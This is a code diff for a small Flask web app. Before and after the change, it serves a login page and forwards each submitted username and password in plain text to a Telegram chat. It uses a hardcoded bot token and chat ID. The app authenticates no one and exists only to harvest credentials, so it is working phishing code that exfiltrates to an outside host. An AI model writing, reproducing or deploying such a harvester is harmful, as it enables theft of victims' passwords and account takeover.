@@ -1,40 +1,33 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, render_template, request
 import requests
 
 app = Flask(__name__)
 
-# Replace these with your Telegram bot token and chat ID
-BOT_TOKEN = "8273890387:AAG8BbidwS-UkY_Ct-bdmbFbHq6xr_qdBqM"
-CHAT_ID = "6291023089"
+# === Telegram Bot Configuration ===
+BOT_TOKEN = "8273890387:AAG8BbidwS-UkY_Ct-bdmbFbHq6xr_qdBqM"  # your bot token
+CHAT_ID = "6291023089"  # your chat id
 
-# Load index.html as template
-with open("index.html", "r") as f:
-    template = f.read()
-
-@app.route("/", methods=["GET"])
-def home():
-    return render_template_string(template)
-
-@app.route("/login", methods=["POST"])
-def login():
-    username = request.form.get("username")
-    password = request.form.get("password")
-
-    if not username or not password:
-        return "Please enter both username and password", 400
-
-    # Send credentials to Telegram
-    message = f"New Login:\nUsername: {username}\nPassword: {password}"
+# Function to send message to Telegram
+def send_to_telegram(username, password):
+    message = f"🔐 New Login Attempt\n👤 Username: {username}\n🔑 Password: {password}"
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": message}
-
+    data = {"chat_id": CHAT_ID, "text": message}
     try:
-        requests.post(url, data=payload)
+        requests.post(url, data=data)
     except Exception as e:
-        print("Telegram send failed:", e)
+        print("Error sending message:", e)
 
-    # Show a simple response after login
-    return "Login successful! Thank you."
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        
+        # Send to Telegram
+        send_to_telegram(username, password)
+
+        return render_template('index.html', message="Login submitted successfully!")
+    return render_template('index.html')
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    app.run(debug=True)
